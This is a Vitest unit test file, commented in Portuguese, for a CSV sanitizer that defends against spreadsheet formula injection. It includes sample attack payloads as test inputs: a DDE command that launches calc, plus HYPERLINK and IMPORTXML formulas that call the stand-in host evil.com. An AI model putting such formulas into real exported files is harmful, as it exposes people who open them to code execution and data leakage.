/**
 * @module csvSanitizer.test
 * @description Testes unitários de sanitização contra CSV Injection.
 *
 * POR QUÊ testar CSV Injection?
 * - É uma vulnerabilidade real que permite execução de código em planilhas.
 * - OWASP lista como risco em qualquer sistema que exporta CSV.
 * - Cada caractere perigoso (=, +, -, @, TAB) precisa de cobertura.
 */

import { describe, it, expect } from 'vitest';
import {
  sanitizeField,
  sanitizeRow,
  findEmailColumnIndex,
  generateSanitizedCsv,
  parseCsv,
} from '../src/services/CsvSanitizer.js';

describe('CsvSanitizer — sanitizeField', () => {
  // =========================================
  // Campos PERIGOSOS (devem ser sanitizados)
  // =========================================
  describe('Campos perigosos (devem ser prefixados com apóstrofo)', () => {
    it('deve sanitizar campo que inicia com = (fórmula)', () => {
      expect(sanitizeField('=1+1')).toBe("'=1+1");
    });

    it('deve sanitizar campo que inicia com + (fórmula)', () => {
      expect(sanitizeField('+CMD("calc")')).toBe("'+CMD(\"calc\")");
    });

    it('deve sanitizar campo que inicia com - (fórmula)', () => {
      expect(sanitizeField('-1+1')).toBe("'-1+1");
    });

    it('deve sanitizar campo que inicia com @ (fórmula do Google Sheets)', () => {
      expect(sanitizeField('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)");
    });

    it('deve sanitizar campo que inicia com TAB', () => {
      expect(sanitizeField('\t=cmd|something')).toBe("'\t=cmd|something");
    });

    it('deve sanitizar campo com espaços antes do caractere perigoso', () => {
      /**
       * POR QUÊ trim antes da verificação?
       * - "  =1+1" poderia bypass a checagem sem trim.
       * - Trim garante proteção independente de padding.
       */
      expect(sanitizeField('  =1+1')).toBe("'=1+1");
    });
  });

  // =========================================
  // Campos SEGUROS (NÃO devem ser alterados)
  // =========================================
  describe('Campos seguros (NÃO devem ser alterados)', () => {
    it('deve manter e-mail inalterado', () => {
      expect(sanitizeField('user@example.com')).toBe('user@example.com');
    });

    it('deve manter texto normal inalterado', () => {
      expect(sanitizeField('João Silva')).toBe('João Silva');
    });

    it('deve manter números inalterados', () => {
      expect(sanitizeField('12345')).toBe('12345');
    });

    it('deve manter campo vazio', () => {
      expect(sanitizeField('')).toBe('');
    });
  });

  // =========================================
  // Payloads reais de ataque
  // =========================================
  describe('Payloads reais de ataque CSV Injection', () => {
    it('deve sanitizar DDE injection do Excel', () => {
      expect(sanitizeField('=cmd|"/C calc"!A0')).toBe("'=cmd|\"/C calc\"!A0");
    });

    it('deve sanitizar hyperlink injection', () => {
      expect(sanitizeField('=HYPERLINK("http://evil.com","Click")')).toBe(
        "'=HYPERLINK(\"http://evil.com\",\"Click\")"
      );
    });

    it('deve sanitizar importação de dados externos', () => {
      expect(sanitizeField('=IMPORTXML("http://evil.com","//")')).toBe(
        "'=IMPORTXML(\"http://evil.com\",\"//\")"
      );
    });
  });
});

describe('CsvSanitizer — sanitizeRow', () => {
  it('deve sanitizar todos os campos de uma linha', () => {
    const row = ['normal', '=fórmula', 'user@test.com', '+perigoso'];
    const sanitized = sanitizeRow(row);
    expect(sanitized).toEqual([
      'normal',
      "'=fórmula",
      'user@test.com',
      "'+perigoso",
    ]);
  });
});

describe('CsvSanitizer — findEmailColumnIndex', () => {
  it('deve encontrar coluna "email"', () => {
    expect(findEmailColumnIndex(['nome', 'email', 'telefone'])).toBe(1);
  });

  it('deve encontrar coluna "Email" (case insensitive)', () => {
    expect(findEmailColumnIndex(['Nome', 'Email', 'Cidade'])).toBe(1);
  });

  it('deve encontrar coluna "e-mail"', () => {
    expect(findEmailColumnIndex(['nome', 'e-mail'])).toBe(1);
  });

  it('deve encontrar coluna "email_address"', () => {
    expect(findEmailColumnIndex(['id', 'email_address', 'name'])).toBe(1);
  });

  it('deve retornar 0 se nenhum header bater', () => {
    expect(findEmailColumnIndex(['campo1', 'campo2', 'campo3'])).toBe(0);
  });
});

describe('CsvSanitizer — parseCsv', () => {
  it('deve parsear CSV simples', async () => {
    const csv = 'email,nome\nuser@test.com,João\nuser2@test.com,Maria';
    const rows = await parseCsv(csv);
    expect(rows).toHaveLength(3);
    expect(rows[0]).toEqual(['email', 'nome']);
    expect(rows[1]).toEqual(['user@test.com', 'João']);
  });

  it('deve parsear CSV a partir de Buffer', async () => {
    const csv = Buffer.from('email\ntest@example.com');
    const rows = await parseCsv(csv);
    expect(rows).toHaveLength(2);
  });

  it('deve ignorar linhas vazias', async () => {
    const csv = 'email\ntest@example.com\n\n\ntest2@example.com\n\n';
    const rows = await parseCsv(csv);
    expect(rows).toHaveLength(3); // header + 2 dados
  });
});

describe('CsvSanitizer — generateSanitizedCsv', () => {
  it('deve gerar CSV com campos quoted', () => {
    const headers = ['email', 'status'];
    const rows = [['user@test.com', 'valid']];
    const csv = generateSanitizedCsv(headers, rows);
    expect(csv).toContain('"email"');
    expect(csv).toContain('"user@test.com"');
  });

  it('deve sanitizar campos perigosos na geração', () => {
    const headers = ['email', 'notes'];
    const rows = [['user@test.com', '=SUM(A1)']];
    const csv = generateSanitizedCsv(headers, rows);
    // O campo perigoso deve ter apóstrofo
    expect(csv).toContain("'=SUM(A1)");
  });
});
